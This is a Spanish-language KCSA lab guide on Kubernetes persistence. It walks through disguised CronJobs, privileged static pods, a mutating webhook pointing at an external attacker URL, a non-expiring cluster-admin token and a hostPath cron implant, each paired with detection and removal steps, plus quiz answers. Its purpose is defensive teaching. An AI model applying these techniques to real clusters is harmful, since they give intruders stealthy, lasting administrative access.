# Ejercicios guiados — Tema 4.2: Persistence (KCSA)

> **Dominio:** Kubernetes Threat Model — *Persistence*
> **Objetivo del examen:** reconocer cómo un atacante que ya obtuvo un punto de apoyo en el cluster mantiene su acceso a lo largo del tiempo, sobreviviendo a reinicios de pods, borrados de recursos y hasta reinicios del nodo; y cómo un defensor detecta y elimina esa persistencia.
>
> Estos ejercicios reproducen técnicas de *persistence* en un cluster de laboratorio **de tu propiedad y aislado**. El propósito es **defensivo**: entender el mecanismo para saber dónde buscarlo y cómo cortarlo. No ejecutes esto contra clusters que no controlás.

## Contexto conceptual

La táctica *Persistence* en el modelo de amenazas de Kubernetes agrupa las técnicas con las que un atacante **conserva acceso** después de la intrusión inicial. Se corresponde con la táctica `TA0003` de **MITRE ATT&CK for Containers** y con la fila *Persistence* de la *Threat Matrix for Kubernetes*. Las técnicas clave que evalúa KCSA:

- **Backdoor container / workloads** que se re-crean solos (Deployment, DaemonSet, **CronJob**).
- **Static Pods** colocados directamente en el nodo, fuera del control del API server.
- **Admission webhooks maliciosos** (`MutatingWebhookConfiguration`) que reinyectan el backdoor en cada nuevo pod.
- **Credenciales de larga vida**: `ServiceAccount` tokens no expirables y `ClusterRoleBinding` fantasma.
- **`hostPath` writable**: escritura en el filesystem del nodo para sobrevivir al ciclo de vida del pod.

Fuentes oficiales:
- KCSA Curriculum — https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf
- MITRE ATT&CK for Containers (TA0003 Persistence) — https://attack.mitre.org/matrices/enterprise/containers/
- Kubernetes — Static Pods — https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- Kubernetes — Dynamic Admission Control — https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/
- Kubernetes — ServiceAccount tokens — https://kubernetes.io/docs/concepts/security/service-accounts/

## Requisitos del laboratorio

- Un cluster desechable de **un solo nodo**: `kind create cluster --name kcsa-persist` o `minikube start`.
- `kubectl` con acceso `cluster-admin` (representás al atacante que ya escaló privilegios y también al defensor).
- Acceso al nodo. En `kind`: `docker exec -it kcsa-persist-control-plane bash`.
- Un namespace de trabajo: `kubectl create namespace redteam`.

> Al terminar, `kind delete cluster --name kcsa-persist` destruye todo. **No reutilices este cluster para otra cosa.**

---

## Ejercicio 1 — Backdoor que se auto-recrea: el CronJob

Un pod muerto es persistencia perdida. Un atacante prefiere un objeto **controlador** que reprograme el backdoor solo. El `CronJob` es el vector más limpio: reaparece según su `schedule` aunque borres cada Job que genera.

1. Creá el CronJob de persistencia. Aquí solo escribe una marca en un ConfigMap cada minuto; en un ataque real abriría un *reverse shell*:

   ```bash
   cat <<'EOF' | kubectl apply -f -
   apiVersion: batch/v1
   kind: CronJob
   metadata:
     name: metrics-agent          # nombre benigno, se mimetiza
     namespace: redteam
   spec:
     schedule: "* * * * *"        # cada minuto
     concurrencyPolicy: Forbid
     successfulJobsHistoryLimit: 0 # no deja Jobs viejos como rastro
     failedJobsHistoryLimit: 0
     jobTemplate:
       spec:
         template:
           spec:
             restartPolicy: Never
             containers:
             - name: agent
               image: busybox:1.36
               command: ["/bin/sh","-c"]
               args:
               - |
                 echo "beacon $(date -u +%FT%TZ)" >> /proc/1/root/tmp/.beacon 2>/dev/null || true
                 echo "callback executed"
   EOF
   ```

2. Esperá ~70 segundos y verificá que se ejecutó:

   ```bash
   kubectl -n redteam get jobs
   ```
   Salida esperada (el Job aparece y desaparece por el `historyLimit: 0`):
   ```
   NAME                       STATUS     COMPLETIONS   DURATION   AGE
   metrics-agent-29010000     Complete   1/1           4s         8s
   ```

3. Actuá como defensor. Enumerá **todos** los controladores que pueden reprogramar cargas, no solo Deployments:

   ```bash
   kubectl get cronjobs,jobs,deployments,daemonsets,statefulsets -A
   ```

4. Inspeccioná el CronJob sospechoso y notá las señales: `schedule` agresivo, `historyLimit: 0`, imagen genérica y comando con `/proc/1/root` (escape del container hacia el host):

   ```bash
   kubectl -n redteam get cronjob metrics-agent -o yaml | grep -A3 -E 'schedule|args|successfulJobs'
   ```

5. Erradicalo:

   ```bash
   kubectl -n redteam delete cronjob metrics-agent
   ```

**Preguntas de comprensión**

1. ¿Por qué borrar el Pod o el Job generado **no** elimina la persistencia, pero borrar el CronJob sí?
2. ¿Qué función defensiva cumple `successfulJobsHistoryLimit: 0` para el **atacante**, y cómo cambia eso tu estrategia de detección?
3. Mencioná dos controles nativos de Kubernetes que impedirían crear este CronJob en primer lugar.

---

## Ejercicio 2 — Static Pods: persistencia que ignora al API server

Un **static Pod** lo administra directamente el `kubelet` a partir de un archivo en el nodo (`/etc/kubernetes/manifests` por defecto). El API server solo ve un **mirror pod** de solo lectura: **no podés borrarlo con `kubectl delete`**, el kubelet lo re-crea. Es persistencia que sobrevive al reinicio del nodo y no depende de RBAC.

1. Entrá al nodo (representa al atacante con acceso al filesystem del host):

   ```bash
   docker exec -it kcsa-persist-control-plane bash
   ```

2. Colocá el manifiesto del static Pod en el directorio que vigila el kubelet:

   ```bash
   cat > /etc/kubernetes/manifests/system-healthz.yaml <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: system-healthz
     namespace: kube-system
   spec:
     hostNetwork: true
     hostPID: true
     containers:
     - name: shell
       image: busybox:1.36
       command: ["/bin/sh","-c","while true; do sleep 3600; done"]
       securityContext:
         privileged: true
   EOF
   exit
   ```

3. Como defensor, observá que aparece un pod con el **nombre del nodo como sufijo** — firma inconfundible de mirror pod:

   ```bash
   kubectl -n kube-system get pods | grep system-healthz
   ```
   Salida esperada:
   ```
   system-healthz-kcsa-persist-control-plane   1/1   Running   0   30s
   ```

4. Confirmá que es un mirror pod inspeccionando la anotación:

   ```bash
   kubectl -n kube-system get pod system-healthz-kcsa-persist-control-plane \
     -o jsonpath='{.metadata.annotations.kubernetes\.io/config\.source}{"\n"}'
   ```
   Salida esperada:
   ```
   file
   ```
   (Un pod normal diría `api`.)

5. Intentá borrarlo por el API — y observá que **vuelve**:

   ```bash
   kubectl -n kube-system delete pod system-healthz-kcsa-persist-control-plane
   sleep 5
   kubectl -n kube-system get pods | grep system-healthz
   ```
   El pod reaparece en segundos: el kubelet lo reconstruye desde el archivo.

6. Erradicá de verdad — hay que borrar el **archivo en el nodo**:

   ```bash
   docker exec kcsa-persist-control-plane rm /etc/kubernetes/manifests/system-healthz.yaml
   sleep 5
   kubectl -n kube-system get pods | grep system-healthz || echo "erradicado"
   ```

**Preguntas de comprensión**

1. ¿Por qué `kubectl delete` es inútil contra un static Pod, y qué te dice eso sobre dónde reside realmente la persistencia?
2. ¿Cuál es la anotación exacta que distingue un mirror pod de un pod normal, y qué valor toma en cada caso?
3. Este ataque presupone una capacidad concreta del atacante. ¿Cuál es, y qué control la habría bloqueado?

---

## Ejercicio 3 — El webhook que reinyecta el backdoor en cada pod

Un `MutatingWebhookConfiguration` intercepta **cada** creación de pod y puede modificarla. Un atacante lo usa para inyectar un sidecar malicioso en todo workload nuevo del cluster: aunque limpies los pods infectados, cada `kubectl apply` posterior vuelve a nacer comprometido. Es persistencia a nivel de plano de control.

1. Para el laboratorio usamos la forma más simple de demostrar el mecanismo sin desplegar un servidor de webhook completo: un webhook que **añade una etiqueta** a cada pod nuevo. En un ataque real, el servidor devolvería un JSONPatch que agrega un `container` sidecar. El objeto de configuración es idéntico; lo peligroso es su **existencia y alcance**, no la operación concreta.

   ```bash
   cat <<'EOF' | kubectl apply -f -
   apiVersion: admissionregistration.k8s.io/v1
   kind: MutatingWebhookConfiguration
   metadata:
     name: pod-policy-injector    # nombre que suena a "policy" legítima
   webhooks:
   - name: inject.redteam.local
     admissionReviewVersions: ["v1"]
     sideEffects: None
     failurePolicy: Ignore        # no rompe el cluster si el atacante apaga su server
     clientConfig:
       url: "https://198.51.100.10:8443/mutate"   # server del atacante, fuera del cluster
     rules:
     - apiGroups: [""]
       apiVersions: ["v1"]
       operations: ["CREATE"]
       resources: ["pods"]
       scope: "Namespaced"
   EOF
   ```

   > `failurePolicy: Ignore` es la elección del atacante: si su servidor está caído, los pods se crean igual y nadie sospecha. Un webhook de seguridad legítimo suele usar `Fail`.

2. Como defensor, la primera pregunta ante cualquier comportamiento anómalo en pods es: *¿quién puede modificar admisiones?*

   ```bash
   kubectl get mutatingwebhookconfigurations
   kubectl get validatingwebhookconfigurations
   ```
   Salida esperada:
   ```
   NAME                   WEBHOOKS   AGE
   pod-policy-injector    1          40s
   ```

3. Auditá el `clientConfig`. La bandera roja: apunta a una **`url` externa** en vez de a un `service` interno del cluster:

   ```bash
   kubectl get mutatingwebhookconfiguration pod-policy-injector \
     -o jsonpath='{.webhooks[0].clientConfig.url}{"\n"}{.webhooks[0].failurePolicy}{"\n"}'
   ```
   Salida esperada:
   ```
   https://198.51.100.10:8443/mutate
   https://198.51.100.10:8443/mutate
   ```
   *(verás la URL y el `failurePolicy: Ignore`)*

4. Erradicá la configuración:

   ```bash
   kubectl delete mutatingwebhookconfiguration pod-policy-injector
   ```

**Preguntas de comprensión**

1. Explicá por qué este webhook es una forma de persistencia **aunque no cree ningún pod por sí mismo**. ¿Qué evento lo dispara?
2. Nombrá dos campos de la configuración del webhook que, por sí solos, deberían levantar sospecha en una auditoría, y por qué.
3. Un webhook malicioso puede *reinyectar* el backdoor. ¿Qué implica esto para el orden de tus pasos de remediación en un incidente?

---

## Ejercicio 4 — Credenciales de larga vida: token no expirable + ClusterRoleBinding fantasma

Cuando la persistencia por workloads es descubierta, el atacante quiere una **puerta trasera de identidad**: un token que no caduca y un binding con permisos altos y nombre inocuo. Sobrevive a limpiezas de pods porque **no es un pod** — es un `Secret` y un `ClusterRoleBinding`.

1. Creá un `ServiceAccount` y un `Secret` de token **legacy no expirable** (el tipo `kubernetes.io/service-account-token` genera un JWT sin `exp`):

   ```bash
   cat <<'EOF' | kubectl apply -f -
   apiVersion: v1
   kind: ServiceAccount
   metadata:
     name: monitoring
     namespace: kube-system        # se esconde entre SAs del sistema
   ---
   apiVersion: v1
   kind: Secret
   metadata:
     name: monitoring-token
     namespace: kube-system
     annotations:
       kubernetes.io/service-account.name: monitoring
   type: kubernetes.io/service-account-token
   EOF
   ```

2. Atá esa identidad a `cluster-admin` con un binding de nombre benigno:

   ```bash
   kubectl create clusterrolebinding metrics-reader \
     --clusterrole=cluster-admin \
     --serviceaccount=kube-system:monitoring
   ```

3. Extraé el token — persiste indefinidamente aunque borres el pod desde el que se obtuvo:

   ```bash
   kubectl -n kube-system get secret monitoring-token \
     -o jsonpath='{.data.token}' | base64 -d | cut -c1-40; echo "..."
   ```

4. Como defensor, cazá bindings de alto privilegio y quién los ocupa:

   ```bash
   kubectl get clusterrolebindings -o custom-columns=\
   'NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
     | grep -E 'cluster-admin|admin'
   ```
   Salida esperada (aparece tu binding fantasma junto a los legítimos):
   ```
   metrics-reader        cluster-admin   monitoring
   cluster-admin         cluster-admin   system:masters
   ```

5. Detectá los tokens legacy (los que un cluster moderno considera un anti-patrón):

   ```bash
   kubectl -n kube-system get secrets \
     --field-selector type=kubernetes.io/service-account-token
   ```

6. Erradicá **las tres piezas** — el binding, el secret y la ServiceAccount:

   ```bash
   kubectl delete clusterrolebinding metrics-reader
   kubectl -n kube-system delete secret monitoring-token
   kubectl -n kube-system delete serviceaccount monitoring
   ```

**Preguntas de comprensión**

1. ¿Por qué esta técnica sobrevive a un `kubectl delete pod --all -A`? ¿Dónde vive realmente la credencial?
2. Desde Kubernetes 1.24, ¿por qué crear un `Secret` de tipo `kubernetes.io/service-account-token` es en sí mismo una señal sospechosa, frente al mecanismo por defecto (`TokenRequest` API / tokens proyectados)?
3. Remediaste borrando el binding y el token. ¿Basta con eso si el atacante ya extrajo el JWT? ¿Qué acción adicional es imprescindible?

---

## Ejercicio 5 — `hostPath` writable: persistencia en el filesystem del nodo

Los objetos de Kubernetes pueden ser auditados y borrados. El filesystem del **nodo**, no tanto. Un pod con un `hostPath` writable puede depositar un binario, una unit de systemd o un cron del host, y esa carga sobrevive al borrado del pod **y** al reinicio del nodo.

1. Desplegá un pod que monta la raíz del nodo en modo escritura:

   ```bash
   cat <<'EOF' | kubectl apply -f -
   apiVersion: v1
   kind: Pod
   metadata:
     name: node-inspector
     namespace: redteam
   spec:
     containers:
     - name: tool
       image: busybox:1.36
       command: ["/bin/sh","-c","sleep 3600"]
       volumeMounts:
       - name: host
         mountPath: /host          # el filesystem del nodo, escribible
     volumes:
     - name: host
       hostPath:
         path: /
         type: Directory
   EOF
   ```

2. Simulá el depósito del artefacto de persistencia en el host (aquí, un archivo marcador en un `cron.d` del nodo):

   ```bash
   kubectl -n redteam exec node-inspector -- \
     sh -c 'echo "* * * * * root echo persisted >> /tmp/.node-implant" > /host/etc/cron.d/zz-implant; ls -l /host/etc/cron.d/zz-implant'
   ```

3. Ahora borrá el pod — como haría un incident responder que “limpió” la amenaza:

   ```bash
   kubectl -n redteam delete pod node-inspector
   ```

4. Comprobá que el artefacto **sigue en el nodo**, huérfano del pod que lo creó:

   ```bash
   docker exec kcsa-persist-control-plane cat /etc/cron.d/zz-implant
   ```
   Salida esperada:
   ```
   * * * * * root echo persisted >> /tmp/.node-implant
   ```

5. Como defensor, cazá pods con `hostPath` writable montando rutas sensibles:

   ```bash
   kubectl get pods -A -o json | \
     jq -r '.items[] | select(.spec.volumes[]?.hostPath) |
            "\(.metadata.namespace)/\(.metadata.name): \(.spec.volumes[].hostPath.path // empty)"'
   ```

6. Erradicá **en el nodo** — borrar objetos de Kubernetes no alcanza:

   ```bash
   docker exec kcsa-persist-control-plane rm /etc/cron.d/zz-implant
   ```

**Preguntas de comprensión**

1. ¿Por qué el borrado del pod deja la persistencia intacta? ¿Qué frontera de confianza cruzó el `hostPath`?
2. ¿Qué rutas del host, montadas como `hostPath`, son especialmente peligrosas para persistencia, y qué permitiría cada una?
3. Nombrá el control de admisión de Kubernetes que restringe `hostPath` y el nivel de *Pod Security Standard* mínimo que lo prohíbe.

---

## Ejercicio 6 — Cerrando el lazo: detección centralizada con audit logs

Los cinco vectores anteriores comparten una firma común en el **audit log** del API server: todos son operaciones `create` sobre recursos de control. Un defensor no persigue cada técnica por separado; vigila las escrituras a los objetos que confieren persistencia.

1. Revisá qué recursos deberían disparar una alerta al ser creados o modificados. Esta es tu *watchlist* de persistencia:

   | Recurso | Técnica de persistencia |
   |---|---|
   | `cronjobs`, `daemonsets` | backdoor que se auto-recrea |
   | `mutatingwebhookconfigurations` | reinyección en admisión |
   | `clusterrolebindings` (a `cluster-admin`) | puerta trasera de identidad |
   | `secrets` tipo `service-account-token` | token no expirable |
   | pods con `hostPath` / `privileged` / static pods | persistencia en el nodo |

2. Si tu cluster tiene audit logging (en `kind`/`kubeadm`, `/var/log/kubernetes/audit.log`), buscá creaciones de webhooks:

   ```bash
   docker exec kcsa-persist-control-plane sh -c \
     'grep -o "mutatingwebhookconfigurations" /var/log/kubernetes/audit.log 2>/dev/null | wc -l' \
     || echo "audit log no configurado en este lab"
   ```

3. Consolidá una revisión de estado del cluster que un defensor corre periódicamente:

   ```bash
   echo "== Webhooks =="; kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations
   echo "== CronJobs/DaemonSets =="; kubectl get cronjobs,daemonsets -A
   echo "== Bindings de alto privilegio =="; \
     kubectl get clusterrolebindings -o json | \
     jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .metadata.name'
   echo "== Static/mirror pods =="; \
     kubectl get pods -A -o json | \
     jq -r '.items[] | select(.metadata.annotations["kubernetes.io/config.source"]=="file") | "\(.metadata.namespace)/\(.metadata.name)"'
   ```

**Preguntas de comprensión**

1. ¿Por qué el `audit log` del API server **no** capturaría el Ejercicio 2 (static Pod) en el momento de su creación, y sí capturaría el Ejercicio 3 (webhook)?
2. De los cinco vectores, ¿cuáles se erradican por completo con `kubectl delete` y cuáles exigen acción **en el nodo**? Agrupalos y explicá la frontera común.
3. Si tuvieras que priorizar **un** control preventivo que reduzca la superficie de la mayoría de estas técnicas a la vez, ¿cuál elegirías y por qué?

---

<details>
<summary><strong>Respuestas</strong></summary>

### Ejercicio 1 — CronJob

1. El Job y el Pod son **objetos hijos efímeros** que el CronJob reprograma según su `schedule`. Borrarlos elimina una *ejecución*, no la *fuente*. El `CronJob` es el controlador que sobrevive y vuelve a crear hijos; solo borrándolo (o su capacidad de crearse) se corta la persistencia. Es la misma lógica que con Deployment→ReplicaSet→Pod: hay que atacar al controlador de más arriba.
2. Con `successfulJobsHistoryLimit: 0` no quedan Jobs completados como rastro: si el defensor mira solo `kubectl get jobs` entre ejecuciones, no ve nada. Obliga a cambiar la detección desde *“buscar Jobs sospechosos”* hacia *“auditar la existencia del CronJob y las creaciones de Job en el audit log”*, porque la evidencia en reposo fue borrada deliberadamente.
3. (a) **RBAC de mínimo privilegio**: negar `create` sobre `cronjobs`/`jobs` a las identidades que no lo necesitan. (b) **Admission control** (`ValidatingAdmissionPolicy`, OPA/Gatekeeper o Kyverno) que rechace CronJobs con imágenes no aprobadas, montajes de `/proc`/`hostPath`, o schedules anómalos. También sirve el **Pod Security Standard `baseline`/`restricted`** aplicado al namespace, que bloquea el acceso a `/proc/1/root` vía `hostPID`/privilegios.

### Ejercicio 2 — Static Pods

1. Un static Pod lo administra el **kubelet** directamente desde un archivo local del nodo (`/etc/kubernetes/manifests/`). Lo que ves por el API es un **mirror pod** de solo lectura. `kubectl delete` borra el espejo, pero el kubelet lo reconstruye desde el archivo en el próximo ciclo de sincronización. La persistencia **reside en el filesystem del nodo**, no en `etcd` ni en el API server; hay que borrar el archivo en el nodo.
2. La anotación es `kubernetes.io/config.source`. Vale **`file`** para un static/mirror pod (o `http` si el kubelet lo obtiene de una URL) y **`api`** para un pod normal creado a través del API server.
3. Presupone que el atacante tiene **escritura en el filesystem del nodo** (acceso al host, típicamente vía un container privilegiado, un `hostPath` writable a `/etc/kubernetes`, o SSH al nodo). Lo habrían bloqueado: **Pod Security `restricted`** (sin privilegios ni `hostPath` sensibles), controles de admisión que prohíban montar rutas del sistema, y hardening del host (RBAC de nodo, acceso SSH restringido, filesystem del directorio de manifests monitorizado por integridad — p. ej. un IDS de archivos).

### Ejercicio 3 — Mutating admission webhook

1. Es persistencia porque **se dispara en cada operación `CREATE` de pod** en todo el cluster. No necesita crear nada por sí mismo: espera pasivamente y modifica (inyecta el backdoor en) cada pod nuevo que el resto del cluster produce. Aunque limpies todos los pods comprometidos, el siguiente `apply` de cualquier usuario vuelve a nacer infectado mientras el webhook exista. El evento disparador es la **admisión de nuevos objetos** en el API server.
2. (a) **`clientConfig.url` apuntando a un endpoint externo** (`https://198.51.100.10:...`) en lugar de un `service` interno del cluster: exfiltra cada AdmissionReview a infraestructura del atacante y recibe el patch desde afuera. (b) **`failurePolicy: Ignore`** en un webhook que interviene *todos* los pods: los webhooks de seguridad legítimos suelen usar `Fail` para no dejar pasar cargas sin política; `Ignore` delata a un atacante que no quiere romper el cluster (y así ocultarse) si su server cae. Señales adicionales: `rules` demasiado amplias (`resources: ["pods"]`, `operations: ["CREATE"]` a nivel cluster) y `sideEffects: None` con una URL remota.
3. La remediación tiene un **orden obligatorio**: primero **borrar el `MutatingWebhookConfiguration`**, y recién después limpiar los pods comprometidos. Si limpiás los pods primero, el webhook reinyecta el backdoor en los reemplazos y entrás en un bucle sin fin. Regla general en *persistence*: **cortar el mecanismo de re-creación antes que las instancias**.

### Ejercicio 4 — Token no expirable + ClusterRoleBinding fantasma

1. La credencial no vive en ningún pod: vive en un **`Secret`** (el JWT) y su privilegio en un **`ClusterRoleBinding`**, ambos objetos de `etcd` independientes del ciclo de vida de cualquier pod. Borrar todos los pods no toca ninguno de los dos. El atacante puede autenticarse contra el API desde **fuera** del cluster con ese token.
2. Desde 1.24 Kubernetes **ya no genera automáticamente** Secrets de token por ServiceAccount; el mecanismo por defecto es la **`TokenRequest` API** con tokens **proyectados, de vida corta y con `audience`/`exp`**. Crear a mano un `Secret` de tipo `kubernetes.io/service-account-token` produce un token **legacy sin `exp` (no expira)** — exactamente lo que un atacante quiere y lo que un flujo legítimo moderno evita. Su mera presencia en `kube-system` es un anti-patrón que amerita investigación.
3. **No basta.** Un JWT de ServiceAccount legacy **no se puede revocar individualmente** mientras la ServiceAccount y su namespace existan: sigue siendo válido aunque borres el Secret. Para invalidarlo de verdad hay que **borrar (y idealmente recrear) la ServiceAccount**, lo que rota el key material asociado, o rotar las **signing keys** del API server. Además: borrar el `ClusterRoleBinding` quita el privilegio aunque el token siga autenticando. La acción imprescindible es **invalidar la identidad**, no solo el objeto Secret.

### Ejercicio 5 — `hostPath` writable

1. El artefacto (el `cron.d`, un binario, una systemd unit) se escribió en el **filesystem del nodo**, que está **fuera del ciclo de vida del pod** y fuera de `etcd`. El pod fue solo el vehículo de entrega. El `hostPath` cruzó la **frontera de aislamiento container→host**: lo depositado en el host persiste al borrado del pod e incluso al reinicio del nodo.
2. Rutas peligrosas: **`/etc/cron.d`, `/etc/crontab`** (ejecución programada como root), **`/etc/systemd/system` o `/lib/systemd`** (servicios persistentes), **`/etc/kubernetes/manifests`** (static pods — enlaza con el Ejercicio 2), **`/root/.ssh` o `/home/*/.ssh`** (`authorized_keys` para SSH persistente), **`/var/lib/kubelet` y los certs/kubeconfig del nodo** (robo de credenciales del nodo), y **`/` o el runtime socket `/var/run/docker.sock`/`containerd.sock`** (control total del host).
3. El control es **`hostPath` volume restrictions** vía admisión. El **Pod Security Standard `baseline`** ya restringe volúmenes peligrosos, y **`restricted`** **prohíbe `hostPath` por completo**. Equivalente con OPA/Gatekeeper o Kyverno mediante una policy que deniegue `spec.volumes[*].hostPath`.

### Ejercicio 6 — Detección centralizada

1. La creación del static Pod (Ej. 2) **no pasa por el API server**: el atacante escribe un archivo en el nodo y es el **kubelet** quien lo materializa, por lo que **no genera un evento `create` en el audit log**. Lo único que llega al API es el registro del *mirror pod*, que aparece como un pod ya existente, no como una acción de un usuario. El webhook (Ej. 3), en cambio, se crea con `kubectl apply` contra el API server, así que **queda registrado como `create mutatingwebhookconfigurations`** en el audit log. Lección: los vectores basados en el nodo evaden el audit log del API y requieren monitorización **a nivel de host** (integridad de archivos, EDR en el nodo).
2. **Se erradican solo con `kubectl delete`**: CronJob (Ej. 1), MutatingWebhookConfiguration (Ej. 3) y el binding/token (Ej. 4, con la salvedad de invalidar la identidad). **Exigen acción en el nodo**: static Pod (Ej. 2, borrar el archivo de manifests) y el implante por `hostPath` (Ej. 5, borrar el artefacto del host). La **frontera común**: la persistencia que vive en objetos de `etcd`/API se limpia con la API; la que cruzó al **filesystem del nodo** solo se limpia en el nodo. Identificar de qué lado de esa frontera está cada técnica es lo que decide tu plan de remediación.
3. Una respuesta sólida: aplicar el **Pod Security Standard `restricted`** (o su equivalente en policy engine) a todos los namespaces de carga. De un plumazo bloquea contenedores privilegiados, `hostPath`, `hostPID`/`hostNetwork` y escalada de privilegios — que son la capacidad habilitante de los Ejercicios 2 y 5 y refuerza el 1. Igual de defendible: **RBAC de mínimo privilegio**, porque la creación de `mutatingwebhookconfigurations`, `clusterrolebindings` y `cronjobs` requiere permisos que casi ninguna identidad de aplicación debería tener; restringirlos ataca los Ejercicios 1, 3 y 4 a la vez. La clave del razonamiento es reconocer que casi toda la táctica *Persistence* depende de **permisos excesivos** o de **capacidades de ruptura de aislamiento**, y ambos controles atacan la raíz en lugar de cada síntoma.

</details>